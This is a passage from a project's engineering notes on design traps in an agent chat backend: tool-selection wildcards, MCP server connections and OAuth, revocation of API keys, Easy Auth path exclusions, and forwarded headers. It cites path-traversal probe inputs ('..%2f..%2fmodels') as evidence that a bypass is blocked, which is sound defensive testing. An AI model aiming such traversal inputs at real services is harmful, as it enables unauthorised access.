  no check) is validated against the generated vector length and a mismatch throws
  `EmbeddingDimensionMismatchException` → a clear 4xx, **before** any upsert — not an opaque Cosmos reject.
  `CosmosDocumentIndex` uses the
  **raw `CosmosClient` and never creates on use** — the account is `disableLocalAuth: true`, so
  AAD data-plane RBAC can't create the container (same 403 wall as the Orleans providers); a vector
  *connector* that calls `EnsureCollectionExists` would fail here. The container schema in Bicep
  (property names `ownerKey`/`embedding`, lowercase `id`) must exactly match the item POCO the code
  writes/reads. This path **cannot be exercised offline**: `Program.cs` registers `CosmosDocumentIndex`
  only when `Cosmos:DocChunksContainerName` is set (threaded from Bicep in prod); under the AppHost
  Cosmos emulator that key is absent, so the in-memory index is used and the emulator never runs a
  vector query — the emulator uses a well-known key and can't reproduce the no-create-rights wall
  anyway. The `ORDER BY VectorDistance(...)` (ascending) → most-similar-first ordering is a prod-smoke
  fact (AC7), not something the offline harness verifies.
- **Evidence:** `infra/modules/cosmos.bicep` (`doc-chunks` container + capability), `src/Agent42.Backend/Documents/CosmosDocumentIndex.cs`, `src/Agent42.Backend/Program.cs` (index branch), `.agentic/decisions/0007-document-rag-cosmos-vector-search.md`
- **Verified:** 2026-07-09

### Docnet.Core DocLib.Instance is a process-global native singleton — serialize PDF extraction

- **Claim:** PDF text extraction (ADR 0007) uses Docnet.Core, which wraps a **process-global native
  PDFium handle** via `DocLib.Instance`. It is **not safe for concurrent `GetDocReader` calls**, so
  `DocumentTextExtractor` serializes every PDF extraction through a single static lock. Do not
  dispose `DocLib.Instance` per call (it frees the native library for the whole process); only the
  `IDocReader`/`IPageReader` are disposed. Fine at per-conversation, synchronous-ingestion scale.
- **Evidence:** `src/Agent42.Agents/Documents/DocumentTextExtractor.cs` (`PdfLock`)
- **Verified:** 2026-07-09

### Selectable tools: `null == all`, and the user default must be fetched BEFORE the first `BuildAgent`

- **Claim:** `EnabledTools` (ADR 0021) is a `List<string>?` on four types, and the type does **not** tell
  you that **`null` means "all selectable tools"**, not "none". Two traps follow. **(1) Never represent
  "all" as an empty list, and never default a new `EnabledTools` field to `[]`** — an empty list is "no
  tools", so defaulting existing state to `[]` would silently strip every tool from every existing user /
  agent / conversation. The `null == all` sentinel is the whole reason there is no migration; the UI
  represents "all selected" as the **full explicit list**, never `null`. **(2) The user-default fetch in
  `OnActivateAsync` must run BEFORE the first `BuildAgent(_modelId)` call.** `BuildAgent` reads
  `_userDefaultEnabledTools` (via `EffectiveEnabledTools`), and `ReceiveReminder` reuses that same
  `_agent` — so fetching the default *after* the build would have the first chat turn **and every reminder
  turn on that activation** register all tools and silently ignore the user's default (the same ordering
  hazard the `_chatClientFactory` resolution guards against for a different field). The default is read
  **once on activation** (accepted staleness, mirrors default-model resolution) — a Preferences change
  reflects in a warm regular chat only on its next activation. **`_mcpTools` (ADR 0024) is a THIRD field
  with the identical hazard** — it is resolved from `IUserMcpToolProvider` in `OnActivateAsync` before the
  first `BuildAgent`, and `BuildAgent` merges it gated per server; resolving it later would omit the user's
  MCP tools from the first chat turn and every reminder turn on that activation.
- **Per-server MCP wildcard (ADR 0026) — a THIRD null==all trap.** Individual MCP servers are now
  selectable as `mcp:{id}` keys; the bare `mcp` key became a **wildcard "all servers"** meta-key that stays
  in `AllSelectableToolKeys` (so `null == all` and legacy `"mcp"` selections keep enabling every server —
  still no migration) but is **removed from `Descriptors`** (no checkbox). The trap: `GetEnabledToolsAsync`
  returns `AllSelectableToolKeys` for a null selection, which carries the bare `mcp` and **no** `mcp:{id}`.
  The picker renders only catalog keys, so `mcp` has no checkbox — a no-op Save would drop the wildcard and
  add no per-server key, **silently disabling every MCP server**. So `GetEnabledToolsAsync` **expands** a
  present `mcp` into `mcp:{serverId}` for each of `_mcpServers` before returning (a read-only client-facing
  projection — the gate `EffectiveEnabledTools`/`IsMcpServerEnabled` still honours the raw wildcard), and
  `renderToolChecks` treats a stored `mcp` as "all servers checked" for the editor surfaces. `Sanitize` must
  **pass through** `mcp:{id}` keys (they are not in `AllSelectableToolKeys`), and the provider emits an
  **empty group per skipped server** so the id list for expansion is complete.
- **Per-skill `skills` wildcard (ADR 0048) — a FOURTH null==all trap, identical in shape to the third.**
  Shipped skills are now selectable as `skill:{name}` keys; the bare `skills` key became a **wildcard "all
  skills"** meta-key that stays in `AllSelectableToolKeys` (legacy `"skills"` selections keep enabling every
  skill — still no migration) but is **removed from `Descriptors`** (no checkbox). Everything the MCP
  paragraph above says applies verbatim with `skill:` for `mcp:`: `GetEnabledToolsAsync` must **expand** a
  present `skills` into `skill:{name}` for every entry in `SkillCatalog` or a no-op Save silently disables
  **every skill**, `Sanitize` must **pass through** `skill:{name}` keys, and `renderToolChecks` must treat a
  stored `skills` as "all skills checked". Three things differ from the MCP case:
  **(a)** ~~the expansion needs **no grain field** — `SkillCatalog` is static and process-wide, so there is
  no `OnActivateAsync` ordering hazard here~~ — **INVERTED by ADR 0049.** That held only while skills were
  process-wide. Uploaded skills are per-user, so `ExpandSkillsWildcard` is **no longer `static`**: it reads
  `_userSkills`, a **FIFTH** field with the identical `OnActivateAsync` hazard, resolved from
  `IUserSkillProvider` before the first `BuildAgent`. Get it wrong and the first chat turn *and every
  reminder turn on that activation* silently ignore the user's uploads. The expansion — and the
  `selectedSkillPaths` gate — both run over the **merged** catalog (`MergedSkills()`: shipped ⊕ uploads,
  upload wins, `OrdinalIgnoreCase`), and they must use the *same* merge or a key the user can tick would
  gate nothing;
  **(b)** the two expansions **compose in a recorded order** —
  `ExpandSkillsWildcard(ExpandMcpWildcard(effective))`, MCP first and skills outermost — because
  `BindAgent_SnapshotsEnabledTools` and `LegacyState_NullEnabledTools_MeansAll` assert an order-sensitive
  sequence; and
  **(c)** `renderToolChecks`'s `cb.checked` is a wildcard OR — **three-way** as of ADR 0048, **four-way**
  since ADR 0058 added the parent-key term — and **both** wildcard terms are load-bearing. Deleting either one
  re-opens this trap for that whole group, and the *only* thing in the repo that catches it is a source-text
  assertion (`SkillPickerAssetsTests.CheckedState_KeepsTheFourWayWildcardOr`) — there is no JS runner. Treat
  that assertion as the guard it is; do not "tidy" it away.
- **Per-MCP-TOOL keys (ADR 0058) — a FIFTH trap, and the only one whose list is not knowable locally.**
  Each tool of a server is now selectable as `mcp:{id}:{toolName}`, a third level under `mcp` ⊃ `mcp:{id}`.
  Four things differ from the third and fourth traps above, and the differences are the whole design:
  **(a) `Sanitize` and `IsMcpServerKey` need NO change** — a per-tool key is a per-server key plus a
  segment, so the existing `StartsWith("mcp:")` prefix test already admits it. That is *why* the key was
  shaped this way. **Nothing anywhere parses a key**; gating and expansion construct one from a known
  `(serverId, toolName)` pair and test membership. Do not add a parser.
  **(b) The expansion source is `KnownToolNames`, NOT live `Tools`, and that is load-bearing.** The picker
  (`GET /api/tools`, reading the config grain) and `ExpandMcpWildcard` (reading the group's
  `KnownToolNames`, carried on `McpServerTools`) must be **one source**. Any divergence mints a key with no
  checkbox, which the next Save drops — the exact hazard these traps exist to close, one level down. This
  is `MergedSkills()`'s discipline, and the reason `AgentGrain` still never touches `IUserMcpConfigGrain`
  (no sixth `OnActivateAsync` field).
  **(c) ⚠ NEVER expand `mcp:{id}` into an EMPTY set.** A server whose `KnownToolNames` is empty (never
  connected) must keep its bare `mcp:{id}` key intact. Expanding it yields a master checkbox with zero
  children, and *both* master states are then wrong: unchecked drops any stored per-tool key and silently
  disables the server; checked — vacuously "all children ticked" over nothing — collapses to `mcp:{id}` and
  silently re-grants tools the user deliberately deselected. `GetEnabledTools_UnknownToolList_KeepsServerKeyIntact`
  pins it. Note the `toolCatalog.length > 0` guard in `profile.js`/`agents.js` does **not** catch this: it
  fires only on a *total* catalog failure.
  **(d) `cb.checked` is now a FOUR-way OR** (`CheckedState_KeepsTheFourWayWildcardOr`), the fourth term
  being `!!tool.parentKey && selected.has(tool.parentKey)` — what makes a stored `mcp:{id}` render as *all
  of its tools ticked* rather than as an empty group. And `renderToolChecks` must partition MCP rows on
  **`parentKey`**, never `startsWith("mcp:")`, because a server row and its tool rows share that prefix.
  Two client rules have **no runtime test** (no JS runner, by design) and are guarded only by source text in
  `McpToolPickerAssetsTests`: the **collapse** rule (an all-ticked server saves as the bare `mcp:{id}`, so
  it still picks up tools the server adds later) and the **preservation** rule (`readToolChecks` carries
  forward per-tool keys for servers whose children were not rendered, over a **per-container `WeakMap`** —
  a module-level slot would be correct only under an unstated "every read follows that container's own
  render" invariant across three dialogs). The preservation rule was verified by hand over CDP *and*
  mutation checked: removing it makes an unrelated toggle silently destroy the stored selection (measured,
  `persistedAfterSave: []`). Treat those assertions as the guards they are.
- **`memory` (ADR 0057) is a static key, NOT a fifth wildcard — but it breaks two other assumptions.**
  It needs no expansion, no `Sanitize` pass-through and no `renderToolChecks` term: it is an ordinary key
  in both `AllSelectableToolKeys` and `Descriptors`, and the picker renders it as a builtin with no
  frontend change at all. Two things about it are novel and worth not re-deriving. **(a) It is the first
  key in `Descriptors` with NO `ToolNameToKey` entry**, because it gates an `AIContextProvider` rather
  than a tool — safe only because the key-coverage guard runs name → key and there is no reverse guard;
  do not "complete" the map by inventing one. **(b) It is EXEMPT from the selection ∩ capability
  intersection** that `ToolCatalog`'s docstring otherwise states universally — see the
  `AgentSkillsProvider` is a TOOL entry for the three-way table. It also lands **OFF for anyone who ever
  pressed Save**, the ADR 0048/0053 divergence, with no migration — and on agent chats there is **no
  in-UI remedy at all** (`BindAgentAsync` always materialises, a re-bind returns early, and the popover
  is hidden on agent chats), which is accepted and documented rather than fixed.
- **Evidence:** `src/Agent42.Agents/Conversations/AgentGrainState.cs` (`[Id(10)] EnabledTools`),
  `src/Agent42.Agents/Tools/ToolCatalog.cs` (`Sanitize`, `AllSelectableToolKeys`, `Mcp` + `Skills` wildcards,
  `IsMcpServerEnabled`, `McpServerKey`, `IsSkillEnabled`, `SkillKey`),
  `src/Agent42.Agents/Tools/SkillCatalog.cs` (`Discover` — one root enumeration reading
  `AgentFileSkill.Path`, guarded whole because `Lazy` caches a throw; the `Task.Run` sync-over-async bridge),
  `src/Agent42.Agents/Conversations/AgentGrain.cs` (`OnActivateAsync` fetch before the first
  `BuildAgent`, and the `_mcpServers` field),
  `src/Agent42.Agents/Tools/AgentGrain.BuildAgent.cs` (`EffectiveEnabledTools`, `ExpandMcpWildcard`,
  `ExpandSkillsWildcard`, the per-server MCP gate and the per-skill `selectedSkillPaths` gate in
  `BuildAgent`),
  `src/Agent42.Backend/wwwroot/js/tools.js` (`renderToolChecks`'s four-way `cb.checked`, ADR 0058),
  `tests/Agent42.Tests/AgentGrainTests.cs` (`LegacyState_NullEnabledTools_MeansAll`,
  `UserDefault_AppliesWhenNoOverride`, `McpTools_ResolvedBeforeFirstBuildAgent`,
  `PerServerSelection_EnablesOnlySelectedServer`, `GetEnabledTools_NullSelection_ExpandsWildcardToPerServerKeys`,
  `PerSkillSelection_AdvertisesOnlySelectedSkill`, `LegacySkillsWildcard_EnablesEverySkill`,
  `GetEnabledTools_NullSelection_ExpandsSkillsWildcard`),
  `tests/Agent42.Tests/SkillPickerAssetsTests.cs` (`CheckedState_KeepsTheFourWayWildcardOr`),
  `tests/Agent42.Tests/ToolCatalogTests.cs`, `.agentic/decisions/0021-selectable-tools-three-layer.md`,
  `.agentic/decisions/0024-config-driven-remote-mcp-servers.md`,
  `.agentic/decisions/0026-per-mcp-server-selectable-tools.md`,
  `.agentic/decisions/0048-per-skill-selectable-tools.md`,
  `src/Agent42.Agents/UserSkills/IUserSkillProvider.cs` + `UserSkillProvider.cs` (the per-user layer),
  `.agentic/decisions/0049-upload-agent-skills.md`,
  `.agentic/decisions/0057-memory-as-a-selectable-tool.md`
- **Verified:** 2026-08-29

### Remote MCP servers: a live-socket cache (bound it), a group-gated catalog exception, and a route-matcher trap

- **Claim:** config-driven remote MCP servers (ADR 0024) copy the ADR 0018 provider-overlay shape, but three
  things do **not** transfer and are invisible in the copied code. **(1) The tool provider's version cache
  holds LIVE connections — bound it.** `UserChatClientFactoryProvider`'s cache is never evicted because a
  chat-client factory is a cheap object; an `McpClient` is an open socket, so an unbounded `(userId, version)`
  cache leaks one connection per config change. `UserMcpToolProvider` retains the most recent
  **2** versions per user and disposes older on eviction (an in-flight grain then sees a disposed client as a
  skipped tool — tolerated). Do **not** ship the unbounded copy. **(2) MCP tools are the documented exception
  to the "every registered tool maps to a catalog key" guard.** MCP tool names are user-defined and dynamic,
  so they are deliberately **absent** from `ToolCatalog.ToolNameToKey` — `IsToolEnabled` would keep an unmapped
  name **unconditionally**, bypassing the picker. So MCP tools are gated **per server** in `BuildAgent`
  (ADR 0026, was one `mcp` group key in ADR 0024): a loop over `_mcpServers` keeping each server whose
  `ToolCatalog.IsMcpServerEnabled(id, enabled)` is true — i.e. the selection contains the `mcp` **wildcard**
  OR the server's `mcp:{id}` key — under `SupportsTools`, inserted **after** the `IsToolEnabled` filter and
  **before** the `Tools = SupportsTools ? …` capability intersection. The guard test carves MCP tools out by
  the provider's set, never by name-guessing. See the null==all gotcha for the wildcard-expansion trap.
  **(3) Adding the `/api/mcp-servers` endpoints made
  `IMcpSecretProtector` a route-matcher dependency for the WHOLE host.** Minimal-API infers every endpoint's
  parameters up front, so an `IMcpSecretProtector` handler param that DI can't resolve is treated as a body and
  breaks routing for *every* endpoint (this bit all six `MapAgentApi` hosts — DevHost 500s + 39 test failures —
  until each registered it). The MCP **endpoint is deliberately NOT SSRF-guarded** (config, not a model/request
  — may be `localhost`), exactly like the user-provider endpoint (see that gotcha).
  **(4) `RecordToolNamesAsync` is the ONE write that must not bump the version (ADR 0058), and (1) is why.**
  Every other write goes through `BumpAsync`, and the version is the key the cache in (1) holds **live MCP
  sockets** under. Discovered tool names are picker metadata, not connection config, so persisting them must
  not tear down every warm grain's connections for that user. Get the reason right, because a wrong one
  invites a "simplification": the method is *also* a no-op when the names are unchanged, and that half alone
  would already stop a bumping write from recurring forever — so "it would bump on every activation" is
  **not** the justification. Even a single genuine name change must not invalidate the socket cache. Do not
  reuse `SaveAsync` for it, and note the doc comments on `SaveAsync`/`GetVersionAsync`/`UserMcpConfig` now say
  "every CONFIGURATION write" for exactly this reason.
  **(5) `GET /api/tools` must NEVER call `IUserMcpToolProvider`.** Two measured reasons: `ConnectAllAsync` is
  a **sequential** `foreach` with a **10 s** timeout per server behind a per-user semaphore, so three dead
  servers cost ~30 s before the picker is usable; and resolving an InteractiveOAuth token **refreshes and
  saves it**, so the GET would become a **write** that bumps the version and invalidates the socket cache on
  a page load. The endpoint reads persisted `KnownToolNames` instead. The cost was a cold-start window, and
  **ADR 0064 closed it without weakening this rule**: a newly added server has no per-tool checkboxes until
  that user's next chat activation connects to it **or they press Test** (`POST /api/mcp-servers/{id}/test`,
  which is user-pressed, one named server, and also runs automatically after a successful save). The rule
  here was never "never connect" — it is "never connect *on a page load, for every server, implicitly*".
- **Evidence:** `src/Agent42.Backend/Mcp/UserMcpToolProvider.cs` (`RetainedVersionsPerUser`, `EvictBeyondAsync`),
  `src/Agent42.Agents/Tools/ToolCatalog.cs` (`Mcp` wildcard + `IsMcpServerEnabled`, both absent from `ToolNameToKey`),
  `src/Agent42.Agents/Tools/AgentGrain.BuildAgent.cs` (`BuildAgent` per-server MCP gate over `_mcpServers`),
  `src/Agent42.Backend/Program.cs` +
  `tools/Agent42.DevHost/Program.cs` (`IMcpSecretProtector` registration),
  `tests/Agent42.Tests/UserMcpToolProviderTests.cs` (`OldVersions_AreEvicted_AndTheirConnectionsDisposed`),
  `tests/Agent42.Tests/AgentGrainTests.cs` (`EveryRegisteredTool_MapsToACatalogKey_OrIsGetDate_OrIsAnMcpTool`,
  `PerServerSelection_EnablesOnlySelectedServer`),
  `.agentic/decisions/0024-config-driven-remote-mcp-servers.md`,
  `.agentic/decisions/0026-per-mcp-server-selectable-tools.md`,
  `.agentic/decisions/0064-mcp-connection-test-endpoint.md`
- **Verified:** 2026-09-04

### The MCP connection test: two writers of the tool names, and an empty list ERASES them

- **Claim:** since ADR 0064 there are **two** callers of `IUserMcpConfigGrain.RecordToolNamesAsync` —
  `UserMcpToolProvider` (successful connect during activation) and `McpConnectionTester` (successful
  user-pressed `POST /api/mcp-servers/{id}/test`). Both feed the same `KnownToolNames`, the single source for
  the picker's checkboxes *and* `BuildAgent`'s per-tool gate; if they diverge the picker mints
  `mcp:{id}:{tool}` keys with no checkbox and the next Save silently drops them. (A comment in
  `UserMcpToolProvider` claiming a successful connect was *the only* place names are learned is now false and
  was corrected.) They agree today because the provider records names **after** `WrapForTruncation` and
  `TruncatingMcpTool : DelegatingAIFunction` forwards `Name`.
  **The sharp edge: `RecordToolNamesAsync` no-ops when the list is UNCHANGED, not when it is EMPTY.** `[]`
  differs from `[A,B]`, so recording an empty list **erases** the names and makes ADR 0058's supposedly
  unreachable state reachable — the picker renders that server as a bare checkbox reading "tools not
  discovered yet" with the master **unchecked**, while the client's preservation rule keeps the stored
  per-tool keys: a server that reads OFF while still granting a tool. So **record only a non-empty list**.
  `UserMcpToolProvider` has the identical hole and is deliberately NOT fixed (pre-existing, activation-only,
  its own MR); guarding inside the grain is the true one-source fix and was rejected for the same reason.
  Use `RecordToolNamesAsync`, never `SaveAsync` — it deliberately does not bump the version.
  **Three more constraints on the tester, each of which looks optional and is not.** (1) It must resolve OAuth
  tokens through the **shared** `McpOAuthTokenResolver`: that resolver refreshes within a 2-minute skew and
  persists the bundle, so a probe that skipped it would report failure on a server the chat path connects to
  fine — a false negative in a diagnostic tool. Accepted cost: Test on a near-expiry OAuth server bumps the
  overlay version and invalidates that user's warm socket cache. (2) **A test is not an activation** — dispose
  in a `finally`, never touch `IUserMcpToolProvider`; that half is pinned *structurally* (reflection over the
  ctor), because "nothing entered the cache" is not observable at runtime. (3) The failure reason is
  **curated, never the exception** (the `ConfigHealth.ProbeAsync` discipline); the detail goes to
  `LogWarning`.
  **And the one that is pure egress:** the chat path connects only to **enabled** servers
  (`Where(s => s.Enabled)`), so a disabled server's decrypted credentials have never reached its endpoint.
  Pressing Test sends them — intended. The **auto-test on save must stay gated on the Enabled checkbox**, or
  saving a server with the box unchecked delivers its credentials to a host the app never contacted, from a
  path the user never asked for.
  **And the one that is pure UX, found by a user, not by a test:** the auto-test needs a SECOND gate, on a
  stored OAuth token. Save does not perform the interactive sign-in, so for a fresh InteractiveOAuth server
  the dial can only return `not connected (no OAuth token yet)` — a true statement rendered in the error
  style at the one moment it is *guaranteed*, and the one moment the user cannot act on it: the dialog is
  `showModal()`, so the list row carrying the Connect glyph is inert underneath it. It reads as "saving is
  broken, and there is no way to connect". Hence `#mcpConnectBtn` **inside** the dialog, and the gate
  `mcpAuthSelect.value === "InteractiveOAuth" && !storedMcpServer(editingMcpId)?.hasToken`, which reports a
  success instead. Two traps if you touch it: `hasToken` must be read AFTER the `loadMcpServers()` in
  `saveMcpServer` or it is a stale value from before the save; and the gate must test the token, not the
  auth mode, or a **reconnect** of a working server silently stops being verified.
- **Evidence:** `src/Agent42.Backend/Mcp/McpConnectionTester.cs` (`RecordAndDescribeAsync` non-empty guard,
  the `finally` dispose, curated reasons), `src/Agent42.Backend/Mcp/McpOAuthTokenResolver.cs`,
  `src/Agent42.Backend/Mcp/UserMcpToolProvider.cs` (the corrected "one of TWO writers" comment),
  `src/Agent42.Agents/Mcp/IUserMcpConfigGrain.cs` + `src/Agent42.Agents/Mcp/UserMcpConfigGrain.cs`
  (the `SequenceEqual` no-op), `src/Agent42.Backend/wwwroot/js/mcp.js` (the `mcpEnabledInput.checked` gate),
  `tests/Agent42.Tests/McpConnectionTesterTests.cs`
  (`Test_NeverErasesKnownToolNamesOnAZeroToolConnect`, `Test_RefreshesANearExpiryToken`,
  `Test_DisposesItsConnection`, `Tester_DoesNotDependOnTheToolProvider`,
  `Test_ReturnsACuratedReason_NeverTheException`),
  `tests/Agent42.Tests/McpServersAssetsTests.cs` (`SaveFlow_DoesNotAutoTestADisabledServer`,
  `SaveFlow_DoesNotAutoTestAnOAuthServerThatHasNoTokenYet`, `McpDialog_OffersConnectForAStoredOAuthServer`),
  `.agentic/decisions/0064-mcp-connection-test-endpoint.md`
- **Verified:** 2026-09-04

### MCP interactive OAuth is hand-rolled: the SDK flow blocks, the callback must stay behind Easy Auth

- **Claim:** MCP InteractiveOAuth (ADR 0025) does NOT use the `ModelContextProtocol` SDK's OAuth. The SDK
  drives authorization through a **blocking** `AuthorizationRedirectDelegate(authorizationUri, redirectUri,
  ct) → Task<string>` that must open a browser and block until the code returns — a desktop/loopback
  assumption that cannot bridge Agent 42's stateless two-request web flow (`/api/mcp/oauth/start` then a
  separate `/callback`). So the app drives authorization-code + PKCE itself (PRM discovery → authz redirect →
  token exchange). **Two traps.** (1) **Both endpoints must stay BEHIND Easy Auth — never in
  `excludedPaths`** — or `GetUserId()` returns `local-dev` and the tokens bind to the wrong (or no) user; the
  external identity provider redirects the *browser* to `/callback`, which re-enters through the same Easy
  Auth session cookie, so `GetUserId()` works. Manual prereq: the redirect URI
  `https://chat.agent42.nl/api/mcp/oauth/callback` must be registered in each provider's app registration,
  and it is built from `Request.Scheme`/`Host` (relies on forwarded-headers being handled behind the proxy).
  (2) **Refresh is connect-time, not per-request**, and persisting a refreshed token via `SaveAsync` **bumps
  the overlay version**, so the next activation does one extra reconnect — accepted churn, not a bug (a
  per-request `AuthHeaderHandler` refresh was deferred to avoid coupling grain-persist into the connection).
  The whole token bundle (access + refresh + token endpoint + client id + scopes) rides the encrypted
  `StoredMcpServer.TokenCiphertext` — no new schema field.
- **Evidence:** `src/Agent42.Backend/Mcp/McpOAuth.cs` (`McpOAuthClient` discovery/exchange/refresh, `McpPkce`),
  `src/Agent42.Backend/Mcp/AgentApi.Mcp.cs` (`/api/mcp/oauth/start` + `/callback`, `GetUserId()`-scoped),
  `src/Agent42.Agents/Mcp/UserMcpOAuthPendingGrain.cs` (one-time `TakeAsync`),
  `src/Agent42.Backend/Mcp/UserMcpToolProvider.cs` (`ResolveOAuthAccessTokenAsync`),
  `tests/Agent42.Tests/McpOAuthEndpointTests.cs` (`OAuthCallback_PersistsEncryptedTokens`),
  `tests/Agent42.Tests/McpOAuthClientTests.cs` (`Pkce_Challenge_MatchesRfc7636Vector`),
  `.agentic/decisions/0025-mcp-interactive-oauth-app-driven-pkce.md`
- **Verified:** 2026-07-19

### The API-key directory must be kept in sync per-operation, or a revoked key stays live

- **Claim:** a per-agent API key (ADR 0022) authenticates by an **O(1) hash-keyed grain lookup** —
  `IAgentKeyDirectoryGrain` (grain key = SHA-256 hash) → `(userId, agentId)` — because the run endpoint
  has no signed-in user and no agent id in the request. The `AgentRegistryGrain` owns the hash and **must
  pair every hash change with a directory update**, and there is **no single safe write order** — the
  invariant is *"a revoked key must never keep resolving,"* which forces a **per-operation** order:
  **create** writes the registry (new hash) then registers; **delete** removes from the registry then
  deregisters; **regenerate deregisters the OLD hash FIRST**, then writes the new hash, then registers it.
  Regenerate is the opposite of the other two on purpose: registry-write-first there would strand a live
  `oldHash` entry that the stored (now `newHash`) can never clear — a **permanently live revoked key**.
  A missed `DeregisterAsync` leaves a revoked/deleted key resolving; the endpoint's post-resolve
  agent-existence re-check (401 on a null agent) is the delete backstop, not a licence to skip the
  deregister. Keys are 256-bit random, so a single **SHA-256** (no salt, no bcrypt/PBKDF2, no
  `FixedTimeEquals`) is correct — `ApiKey` is the one place that generates *and* hashes, so they can't
  diverge.
- **Evidence:** `src/Agent42.Agents/StoredAgents/ApiKey.cs`, `src/Agent42.Agents/StoredAgents/AgentKeyDirectoryGrain.cs`,
  `src/Agent42.Agents/StoredAgents/AgentRegistryGrain.cs` (`SaveAsync` per-operation ordering, `DeleteAsync`),
  `tests/Agent42.Tests/AgentRegistryGrainTests.cs` (`AgentKey_Regenerate_InvalidatesOldKey`,
  `AgentDelete_DeregistersKey`), `.agentic/decisions/0022-per-agent-api-key-and-async-run-endpoint.md`
- **Verified:** 2026-07-17

### An Easy-Auth `excludedPaths` endpoint is publicly reachable and must self-enforce auth + fail closed

- **Claim:** the whole app is behind Entra Easy Auth (ADR 0002), but `/api/agent-run` (ADR 0022) is added
  to `container-app.bicep`'s `globalValidation.excludedPaths` so a key-only caller isn't redirected to
  login. That makes the path **publicly reachable** — Easy Auth no longer gates it — so the handler is the
  *only* auth boundary and must **self-enforce the key and fail closed** (missing/unknown key → 401,
  deletion-race null agent → 401 not 404 so agent existence isn't disclosed). Two consequences a
  contributor must not miss: **(1)** on an excluded path there is **no `X-MS-CLIENT-PRINCIPAL-ID`**, so
  `GetUserId` returns `local-dev` — the endpoint must take the userId from the **directory resolution**,
  never from `GetUserId`; **(2)** any new endpoint added under this exclusion inherits the same duty. There
  are now **four** entries in the ADR 0002 gate's hole list — `/api/agent-run` (ADR 0022, fails closed
  **401**), `/api/share/*` (ADR 0035, the read-only view; fails closed **404** because it is a
  browser-visitable link, and userId+conversation come from the share directory), and `/shared` + `/shared/*`
  (ADR 0035, the static viewer page and its assets, self-contained so they carry no data) — every other
  browser surface stays fully Easy-Auth-gated.
- **The matching rule (ADR 0042 — this is the trap that shipped a dead feature):** an entry is an **exact**
  match unless it ends in `/*`. A bare `/api/share` does **not** cover `/api/share/{token}`, and a bare
  `/shared` does not even cover `/shared/` — so ADR 0035 shipped with every recipient hitting the Entra
  login page while the Bicep, the ADR and the whole suite all read as correct. A `/*` entry spans **any
  number** of further segments, matches an **empty** remainder (`/shared/*` covers `/shared/`), and keeps the
  trailing slash in its prefix, so it cannot bleed onto a name stem (`/api/sharezzz` stays gated). It is also
  **not** a traversal bypass: `/api/share/../models` and `/api/share/..%2f..%2fmodels` both stay 401. All of
  that was measured against the live app, not inferred — the ingress behaviour itself is still **not**
  unit-testable (TestServer has no Easy Auth), so `EasyAuthExclusionTests` asserts the Bicep list against the
  measured matcher and the real proof stays the post-deploy curl matrix. Verify at deploy — and the reason
  this gotcha exists is that that verification was skipped.
- **Evidence:** `infra/modules/container-app.bicep` (`globalValidation.excludedPaths`),
  `src/Agent42.Backend/StoredAgents/AgentApi.StoredAgents.cs` (`/api/agent-run` — 401 branches),
  `src/Agent42.Backend/Sharing/AgentApi.Sharing.cs` (`/api/share/{token}` — 404 branches, userId from the
  directory, never `GetUserId`),
  `tests/Agent42.Tests/AgentApiTests.cs` (`AgentRun_MissingOrUnknownKey_Returns401`, `ShareLink_UnknownToken_Returns404`),
  `tests/Agent42.Tests/EasyAuthExclusionTests.cs` (the matcher and the four covered/uncovered assertions),
  `.agentic/decisions/0002-entra-easy-auth-gate.md`, `.agentic/decisions/0022-per-agent-api-key-and-async-run-endpoint.md`,
  `.agentic/decisions/0035-read-only-share-links.md`,
  `.agentic/decisions/0042-wildcard-easy-auth-exclusions-and-forwarded-proto.md`
- **Verified:** 2026-08-20

### A scripted whole-file rewrite silently converts the checkout from CRLF to LF and `dotnet format` fails on every line

- **Claim:** there is **no `.gitattributes`** in this repo and `core.autocrlf` is **`true`**, so files are
  stored LF in git and checked out **CRLF** on Windows — and `dotnet format` (the CI lint gate) enforces
  CRLF, reporting `error WHITESPACE: Fix whitespace formatting. Replace N characters with '
…'` on
  **every** line of a file whose endings were flipped. Any tool that reads a file in text mode and writes it
  back — a `python -c` edit, a `sed -i`, most scripted doc rewrites — performs that flip **silently**: the
  content edit is correct, but a 20-line change shows up as a whole-file diff and a wall of lint errors that
  look nothing like their cause. `git diff --stat` is the tell (whole file rewritten), plus the
  `warning: … LF will be replaced by CRLF the next time Git touches it` line git emits. Read and write
  **binary**, or pass `newline=''` on **both** ends. Markdown files bite too — they just fail later, in
  review rather than in lint.
- **Evidence:** `git config core.autocrlf` → `true`; no `.gitattributes` in the tree;
  `.github/workflows/pr-checks.yml` (the `dotnet format` gate);
  `.agentic/specs/completed/plan-share-link-no-login.md` (divergence 5 — where this was hit)
- **Verified:** 2026-08-20

### `Request.Scheme` is `http` behind the ACA ingress unless `UseForwardedHeaders` runs first

- **Claim:** the Container Apps ingress terminates TLS and forwards to the container over plain HTTP, so
  without `UseForwardedHeaders` every request looks like `http` to ASP.NET Core — including a request that
  arrived over TLS at `https://chat.agent42.nl`. Anything that mints an **absolute URL** from
  `Request.Scheme` therefore emits `http://`. Two call sites depend on it and neither is obvious:
  `src/Agent42.Backend/Sharing/AgentApi.Sharing.cs` (`ShareUrl` — the link an owner copies, ADR 0035) and
  `src/Agent42.Backend/Mcp/AgentApi.Mcp.cs` (the interactive-OAuth `redirect_uri`, ADR 0025) — plus the
  framework's own `UseDefaultFiles` 301, which is how the bug was first observed (`GET https://…/shared`
  → `301 → http://…/shared/`). **The MCP one does not self-heal:** when a server supports dynamic client
  registration the minted `ClientId` is persisted on `StoredMcpServer` and reused forever (the code only
  registers while `ClientId` is blank), so a client registered under an `http://` redirect URI keeps
  rejecting the corrected `https://` request with `invalid_redirect_uri` until someone **clears that
  server's stored client id** in Preferences → MCP servers. Two rules for the middleware itself: it must be
  **first**, ahead of the static-file middleware (that 301 is built inside the framework), and the trust
  lists must be **emptied** because the ingress IP is not knowable from inside the container — which means
  `X-Forwarded-Proto` is spoofable. Accepted (ADR 0042): the blast radius is the scheme of a minted URL, and
  only `XForwardedProto` is trusted (never `XForwardedFor`/`XForwardedHost`).
- **Empty them with `.Clear()`, never `KnownNetworks = { }`.** Those properties are get-only, so the
  initializer form parses as a nested *collection initializer* that adds nothing: it compiles, reads as
  "cleared", and silently leaves the defaults (`127.0.0.0/8` and `::1`) in place — so behind a non-loopback
  ingress the middleware ignores `X-Forwarded-Proto` altogether and every minted URL quietly stays `http://`.
  Measured with a `dotnet run app.cs` spike, not assumed. Use `KnownIPNetworks.Clear()` — the legacy
  `KnownNetworks` is the same backing list but raises `ASPDEPR005` on .NET 10. Nothing in the suite runs
